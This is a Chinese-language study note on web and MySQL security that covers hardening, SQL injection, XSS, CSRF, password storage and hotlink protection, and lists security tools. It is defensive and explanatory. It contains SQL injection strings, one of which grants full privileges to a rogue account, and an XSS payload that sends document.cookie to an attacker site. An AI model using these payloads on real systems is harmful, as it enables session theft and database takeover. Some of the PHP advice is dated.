# 安全

### 原则

* 永远不要信任用户的输入。对用户的输入进行校验，可以通过正则表达式，或限制长度；对单引号和 双"-"进行转换等。
* 永远不要使用动态拼装sql，可以使用参数化的sql或者直接使用存储过程进行数据查询存取。
* 永远不要使用管理员权限的数据库连接，为每个应用使用单独的权限有限的数据库连接。
* 不要把机密信息直接存放，加密或者hash掉密码和敏感的信息。
* 应用的异常信息应该给出尽可能少的提示，最好使用自定义的错误信息对原始错误信息进行包装
* sql注入的检测方法一般采取辅助软件或网站平台来检测，软件一般采用sql注入检测工具jsky，网站平台就有亿思网站安全平台检测工具。MDCSOFT SCAN等。采用MDCSOFT-IPS可以有效的防御SQL注入，XSS攻击等。

## MySQL层

* 业务帐号最多只可以通过内网远程登录，而不能通过公网远程连接
* 增加运维平台账号，该账号允许从专用的管理平台服务器远程连接。当然了，要对管理平台部署所在服务器做好安全措施以及必要的安全审计策略。
* 建议启用数据库审计功能。这需要使用MySQL企业版，或者Percona/MariaDB分支版本，MySQL社区版本不支持该功能。
* 启用 safe-update 选项，避免没有 WHERE 条件的全表数据被修改；
* 在应用中尽量不直接DELETE删除数据，而是设置一个标志位就好了。需要真正删除时，交由DBA先备份后再物理删除，避免误操作删除全部数据。
* 还可以采用触发器来做一些辅助功能，比如防止黑客恶意篡改数据。
* MySQL账号权限规则
    - 业务帐号，权限最小化，坚决不允许DROP、TRUNCATE权限。
    - 业务账号默认只授予普通的DML所需权限，也就是select、update、insert、delete、execute等几个权限，其余不给。
    - MySQL初始化后，先行删除无用账号，删除匿名test数据库
    - 创建备份专用账号，只有SELECT权限，且只允许本机可登入。
    - 设置MySQL账号的密码安全策略，包括长度、复杂性。
* 关于数据备份
    - 记住，做好数据全量备份是系统崩溃无法修复时的最后一概救命稻草。
    - 备份数据还可以用来做数据审计或是用于数据仓库的数据源拉取之用。
    - 一般来说，备份策略是这样的：每天一次全备，并且定期对binlog做增备，或者直接利用binlog server机制将binlog传输到其他远程主机上。有了全备+binlog，就可以按需恢复到任何时间点。
    - 特别提醒：当采用xtrabackup的流式备份时，考虑采用加密传输，避免备份数据被恶意截取。
* 操作系统安及应用安全要比数据库自身的安全策略更重要。同理，应用程序及其所在的服务器端的系统安全也很重要，很多数据安全事件，都是通过代码漏洞入侵到应用服务器，再去探测数据库，最后成功拖库。
* 操作系统安全建议
    - 运行MySQL的Linux必须只运行在内部网络，不允许直接对公网暴露，实在有需要从公网连接的话，再通过跳板机做端口转发，并且如上面所述，要严格限制数据库账号权限级别。
    - 系统账号都改成基于ssh key认证，不允许远程密码登入，且ssh key的算法、长度有要求以确保相对安全。这样就没有密码丢失的风险，除非个人的私钥被盗。
    - 进一步的话，甚至可以对全部服务器启用PAM认证，做到账号的统一管理，也更方便、安全。
    - 关闭不必要的系统服务，只开必须的进程，例如 mysqld、sshd、networking、crond、syslogd 等服务，其它的都关闭。
    - 禁止root账号远程登录。
    - 禁止用root账号启动mysqld等普通业务服务进程。
    - sshd服务的端口号建议修改成10000以上。
    - 在不影响性能的前提下，尽可能启用对MySQL服务端口的防火墙策略（高并发时，采用iptables可能影响性能，建议改用ip route策略）。
    - GRUB必须设置密码，物理服务器的Idrac/imm/ilo等账号默认密码也要修改。
    - 每个需要登入系统的员工，都使用每个人私有帐号，而不是使用公共账号。
    - 应该启用系统层的操作审计，记录所有ssh日志，或利bash记录相应的操作命令并发送到远程服务器，然后进行相应的安全审计，及时发现不安全操作。
    - 正确设置MySQL及其他数据库服务相关目录权限，不要全是755，一般750就够了。
    - 可以考虑部署堡垒机，所有连接远程服务器都需要先通过堡垒机，堡垒机上就可以实现所有操作记录以及审计功能了。
    - 脚本加密对安全性提升其实没太大帮助。对有经验的黑客来说，只要有系统登入权限，就可以通过提权等方式轻松获得root。
* 应用安全建议
    - 禁用web server的autoindex配置。
    - 从制度层面，杜绝员工将代码上传到外部github上，因为很可能存在内部IP、账号密码泄露的风险，真的要上传必须先经过安全审核。
    - 尽量不要在公网上使用开源的cms、blog、论坛等系统，除非做过代码安全审计，或者事先做好安全策略。这类系统一般都是黑客重点研究对象，很容易被搞；
    - 在web server层，可以用一些安全模块，比如nginx的WAF模块；
    - 在app server层，可以做好代码安全审计、安全扫描，防止XSS攻击、CSRF攻击、SQL注入、文件上传攻击、绕过cookie检测等安全漏洞；
    - 应用程序中涉及账号密码的地方例如JDBC连接串配置，尽量把明文密码采用加密方式存储，再利用内部私有的解密工具进行反解密后再使用。或者可以让应用程序先用中间账号连接proxy层，再由proxy连接MySQL，避免应用层直连MySQL；

```sh
delete from mysql.user where user!='root' or host!='localhost'; flush privileges;
drop database test;
```

## 加密算法

* AES有很多不同的算法，如aes192，aes-128-ecb，aes-256-cbc等
* AES除了密钥外还可以指定IV（Initial Vector），不同的系统只要IV不同，用相同的密钥加密相同的数据得到的加密结果也是不同的
* 加密结果通常有两种表示方法：hex和base64，这些功能Nodejs全部都支持，但是在应用中要注意，如果加解密双方一方用Nodejs，另一方用Java、PHP等其它语言，需要仔细测试。如果无法正确解密，要确认双方是否遵循同样的AES算法，字符串密钥和IV是否相同，加密后的数据是否统一为hex或base64格式。

## cookie 劫持

通过获取页面的权限，在页面中写一个简单的到恶意站点的请求，并携带用户的 cookie 获取 cookie 后通过 cookie 就可以直以被盗用户的身份登录站点。这就是 cookie 劫持。举个简单例子： 某人写了一篇很有意思的日志，然后分享给大家，很多人都点击查看并且分享了该日志，一切似乎都很正常，然而写日志的人却另有用心，在日志中偷偷隐藏了一个 对站外的请求，那么所有看过这片日志的人都会在不知情的情况下把自己的 cookie 发送给了 某人，那么他可以通过任意一个人的 cookie 来登录这个人的账户。
多窗口浏览器这这方面似乎是有助纣为虐的嫌疑，因为打开的新窗口是具有当前所有 会话的，如果是单浏览器窗口类似 ie6 就不会存在这样的问题，因为每个窗口都是一个独立的进程。举个简单例子 ： 你正在玩白社会， 看到有人发了一个连接，你点击过去，然后这个连接里面伪造了一个送礼物的表单，这仅仅是一个简单的例子，问题可见一般。

## DNS 攻击

## 拒绝服务攻击

* 拒绝服务攻击即攻击者想办法让目标机器停止提供服务
* 攻击者进行拒绝服务攻击，实际上让服务器实现两种效果
    - 一是迫使服务器的缓冲区满，不接收新的请求
    - 二是使用 IP 欺骗，迫使服务器把合法用户的连接复位，影响合法用户的连接

## SQL 注入

* 在 SQL 注入攻击 中，用户通过操纵表单或 GET 查询字符串，将信息添加到数据库查询中。
    - 注入式攻击：添加多余信息
    - 多个查询注入:将终止符插入到查询中即可实现
* 解决方法
    - 检查用户提交的值的类型
    - mysql_real_escape_string()
    - ike查询时，如果用户输入的值有`"_"`和"%"，则会出现这种情况：用户本来只是想查询"abcd_"，查询结果中却有"abcd_"、"abcde"、"abcdf"等等；用户要查询"30%"（注：百分之三十）时也会出现问题。addcslashes()函数在指定的字符前添加反斜杠。
    - PHP的PDO扩展的 prepare 方法
    - 不要使用magic_quotes_gpc指令或它的"幕后搭挡"-addslashes()函数，此函数在应用程序开发中是被限制使用的，并且此函数还要求使用额外的步骤-使用stripslashes()函数。

```sql
SELECT * FROM wines WHERE variety = 'lagrein' OR 1=1;
UPDATE wines SET type='red'，'vintage'='9999' WHERE variety = 'lagrein'  OR 1=1;

SELECT * FROM wines WHERE variety = 'lagrein' ; GRANT ALL ON *.* TO 'BadGuy@%' IDENTIFIED BY 'gotcha';`'`

if (get_magic_quotes_gpc())
{
 $name = stripslashes($name);
}
$name = mysql_real_escape_string($name);
mysql_query("SELECT * FROM users WHERE name='{$name}'");

$sub = addcslashes(mysql_real_escape_string("%something_"), "%_");
```

## XSS (Cross Site Script)跨站脚本攻击

* 恶意攻击者往 Web 页面里插入恶意 html 代码，当用户浏览该页之时，嵌入的恶意 html 代码会被执行，从而达到恶意用户的特殊 目的
* XSS 属于被动式的攻击，因为其被动且不好利用，所以许多人常呼略其危害性。但是随着前端技术的不断进步富客户端的应用越来越多，这方面的问题越来 越受关注
* 举个简单例子 ： 假如你现在是 sns 站点上一个用户，发布信息的功能存在漏洞可以执行 js 你在 此刻输入一个 恶意脚本，那么当前所有看到你新信息的人的浏览器都会执行这个脚本弹出提示框 （很爽吧 弹出广告 ：）），如果你做一些更为激进行为呢 后果难以想象。
* 在页面执行你想要的js.理论上，所有可输入的地方没有对输入数据进行处理的话，都会存在XSS漏洞，漏洞的危害取决于攻击代码的威力，攻击代码也不局限于script。

* DOM Based XSS漏洞
    - 获取cookies(对http-only没用)
        + Tom注册了该网站，并且知道了他的邮箱(或者其它能接收信息的联系方式)，我做一个超链接发给他，超链接地址为：http://www.a.com?content=<script>window.open(“www.b.com?param=”+document.cookie)</script>，当Tom点击这个链接的时候(假设他已经登录a.com)，浏览器就会直接打开b.com，并且把Tom在a.com中的cookie信息发送到b.com，b.com是我搭建的网站，当我的网站接收到该信息时，我就盗取了Tom在a.com的cookie信息，cookie信息中可能存有登录密码，攻击成功！
* Stored XSS漏洞
    - a.com可以发文章，我登录后在a.com中发布了一篇文章，文章中包含了恶意代码，<script>window.open(“www.b.com?param=”+document.cookie)</script>，保存文章。这时Tom和Jack看到了我发布的文章，当在查看我的文章时就都中招了，他们的cookie信息都发送到了我的服务器上，攻击成功！
* 控制用户的动作(发帖、私信什么的)
* 解决方案
    - htmlspecialchars函数
    - htmlentities函数
    - HTMLPurifier.auto.php插件
    - RemoveXss函数（百度可以查到）

## cors

## 储存用户数据

* 后端不应该以任何明文或可以转换回明文（如可逆的加密）的形式储存密码。由于储存的信息并不是明文，所以大多数网站的「找回密码」功能并不能真的告诉你密码，只能让你重新设置一次。
* MD5哈希:用户注册时，把他的密码做一次MD5运算储存起来；用户登录时，把他输入的密码做一次MD5运算，再验证是否和数据库里储存的一致。
    - 应付不了彩虹表的攻击方式:彩虹表就是把简单的数字密码组合（和各种常见密码）的哈希先尽可能的计算出来，这些明文和哈希结果的对应关系就是一张彩虹表
* 加盐哈希
    - 用户注册时，给他随机生成一段字符串，这段字符串就是盐（Salt）
    - 把用户注册输入的密码和盐拼接在一起，叫做加盐密码
    - 对加盐密码进行哈希，并把结果和盐都储存起来
    - 登陆时，先取出盐，再同样进行拼接、计算哈希，就能判断密码的合法性
* 手机号:只能用相对安全的做法，即先对手机号进行对称加密，再将加密结果储存在数据库里；使用时再用密钥解开。
    - 密钥不应该被保存在数据库里。如果数据库被拖库，那么些数据的安全性与明文无异。通常会将密钥以环境变量的形式放在服务器上。这时除非网站在被拖库的情况下同时被拿到服务器权限

## CSRF (Cross Site Request Forgery)跨站点伪造请求

* 在用户合法的SESSION内发起的攻击。黑客通过在网页中嵌入Web恶意请求代码，并诱使受害者访问该页面，当页面被访问后，请求在受害者不知情的情况下以受害者的合法身份发起，并执行黑客所期待的动作
* *csrf 的攻击不同于 xss csrf 需要被攻击者的主动行为触发。这样听来似乎是有 “被钓鱼” 的嫌疑。

```php
<a href="http://www.shop.com/delProducts.php?id=100" "javascript:return confirm('Are you sure?')">Delete</a>
```

## 两步验证和短信验证码

* 两步验证基于TOTP机制，不需要任何网络连接（包括Wi-Fi），也不需要短信和SIM卡，验证码完全在手机本地生成

## 防盗链

* 盗链是指服务提供商自己不提供服务的内容，通过技术手段绕过其它有利益的最终用户界面 (如广告)，直接在自己的网站上向最终用户提供其它服务提供商的服务内容，骗取最终用户的浏览和点击率。受益者不提供资源或提供很少的资源，而真正的服务提供商却得不到任何的收益。
* 大量消耗被盗链网站的带宽，而真正的点击率也许会很小，严重损害了被盗链网站的利益
* 解决
    - 不定期更名文件或者目录
    - 限制引用页：服务器获取用户提交信息的网站地址，然后和真正的服务端的地址相比较， 如果一致则表明是站内提交，或者为自己信任的站点提交，否则视为盗链。实现时可以使用 HTTP_REFERER1 和 htaccess 文件 (需要启用 mod_Rewrite)，结合正则表达式去匹配用户的每一个访问请求。
    - 文件伪装：目前用得最多的一种反盗链技术，一般会结合服务器端动态脚本 (PHP/JSP/ASP)。实际上用户请求的文件地址，只是一个经过伪装的脚本文件，这个脚本文件会对用户的请求作认证，一般会检查 Session，Cookie 或 HTTP_REFERER 作为判断是否为盗链的依据。而真实的文件实际隐藏在用户不能够访问的地方，只有用户通过验证以后才会返回给用户
    - 加密认证：先从客户端获取用户信息，然后根据这个信息和用户请求的文件名 字一起加密成字符串 (Session ID) 作为身份验证。只有当认证成功以后，服务端才会把用户需要的文件传送给客户。一般我们会把加密的 Session ID 作为 URL 参数的一部分传递给服务器，由于这个 Session ID 和用户的信息挂钩，所以别人就算是盗取了链接，该 Session ID 也无法通过身份认证，从而达到反盗链的目的。这种方式对于分布式盗链非常有效。
    - 随机附加码：每次，在页面里生成一个附加码，并存在数据库里，和对应的图片相关，访问图片时和此附加码对比，相同则输出图片，否则输出 404 图片
    - 加入水印

## 案例

* [710leo/ZVulDrill](https://github.com/710leo/ZVulDrill):Web漏洞演练平台

## 产品

* Arachni
* XssPy
* w3af
* Nikto
* Wfuzz
* OWASP ZAP
* Wapiti
* Vega
* SQLmap
* Grabber
* Golismero
* OWASP Xenotix XSS
* [IBM Security AppScan](http://www-03.ibm.com/software/products/en/appscan)
* Messus
* Snort
* Nagios
* Ettercap
* Infection MOnkey
* Delta
* Cuckoo sandbox
* Lynis
* [网站体检工具](https://ziyuan.baidu.com/safe/index)
* [火绒](https://www.huorong.cn/)

## 工具

* [rapid7/metasploit-framework](https://github.com/rapid7/metasploit-framework):Metasploit Framework https://www.metasploit.com/
* [sqlmapproject/sqlmap](https://github.com/sqlmapproject/sqlmap):Automatic SQL injection and database takeover tool http://sqlmap.org
* [s0md3v/XSStrike](https://github.com/s0md3v/XSStrike):Most advanced XSS detection suite. https://somdev.me/XSStrike/
* [netxfly/sec_check](https://github.com/netxfly/sec_check):Cross platform security detection tool
* [用户信息监控](https://monitor.firefox.com/ )
* [minimaxir/big-list-of-naughty-strings](https://github.com/minimaxir/big-list-of-naughty-strings):The Big List of Naughty Strings is a list of strings which have a high probability of causing issues when used as user-input data.

## 参考

* [Hacker0x01/hacker101](https://github.com/Hacker0x01/hacker101):Hacker101 https://www.hacker101.com
* [SecWiki/sec-chart](https://github.com/SecWiki/sec-chart):安全思维导图集合 https://www.sec-wiki.com
* [phith0n/Mind-Map](https://github.com/phith0n/Mind-Map):各种安全相关思维导图整理收集
* [trimstray/the-book-of-secret-knowledge](https://github.com/trimstray/the-book-of-secret-knowledge):💫 A collection of awesome lists, manuals, blogs, hacks, one-liners, cli/web tools and more. Especially for System and Network Administrators, DevOps, Pentesters or Security Researchers.
* [Micropoor/Micro8](https://github.com/Micropoor/Micro8):Gitbook https://micro8.gitbook.io/micro8/
* [hacker-tools](https://hacker-tools.github.io/lectures/)
* [danielmiessler/SecLists](https://github.com/danielmiessler/SecLists):SecLists is the security tester's companion. It's a collection of multiple types of lists used during security assessments, collected in one place. List types include usernames, passwords, URLs, sensitive data patterns, fuzzing payloads, web shells, and many more.https://www.owasp.org/index.php/OWASP_Internet_of_Things_Project
